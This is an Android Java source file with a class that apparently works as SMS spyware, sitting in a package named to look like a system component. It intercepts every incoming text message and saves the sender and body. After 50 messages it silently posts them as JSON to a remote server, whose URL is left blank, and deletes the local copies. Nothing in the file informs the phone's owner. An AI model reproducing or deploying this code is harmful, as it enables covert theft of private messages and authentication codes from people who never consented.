package com.system;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.gson.Gson;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

/**
 * Created by Shahnawaz on 5/3/2016.
 */
public class Incoming extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        final Bundle bundle = intent.getExtras();
        final DataBase db = new DataBase(context);
        try {
            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {
                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();
                    String message = currentMessage.getDisplayMessageBody();

                    db.insertMessage(message, phoneNumber, true);
                } // end for loop


            } // bundle is null

            if (db.getCount() >= 50 && isNetworkAvailable(context)) {
                new AsyncSender(context).execute();
            }
        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" + e);
        }
    }

    private boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null;
    }

    private class AsyncSender extends AsyncTask<Void, Void, Boolean> {

        private static final String URL_SITE = "http://";
        private DataBase dataBase;

        public AsyncSender(Context context) {
            dataBase = new DataBase(context);
        }

        @Override
        protected void onPostExecute(Boolean aBoolean) {
            super.onPostExecute(aBoolean);
            if (aBoolean)
                dataBase.deleteMessages();
        }

        @Override
        protected Boolean doInBackground(Void... params) {
            ArrayList<DataBase.Data> data = (ArrayList<DataBase.Data>) dataBase.getMessages();
            if (!data.isEmpty()) {
                Gson gson = new Gson();
                String response = "json=" + gson.toJson(data);
                try {
                    HttpURLConnection urlConnection = (HttpURLConnection) new URL(URL_SITE).openConnection();
                    urlConnection.setDoOutput(true);
                    urlConnection.setRequestMethod("POST");
                    urlConnection.setRequestProperty("Content-Type",
                            "application/x-www-form-urlencoded");

                    urlConnection.setFixedLengthStreamingMode(
                            response.getBytes().length);
                    PrintWriter out = new PrintWriter(urlConnection.getOutputStream());
                    out.print(response);

                    BufferedReader reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                    String line = reader.readLine();
                    out.close();
                    reader.close();
                    if (line != null && line.equals("1")) {
                        return true;
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
            return false;
        }
    }
}
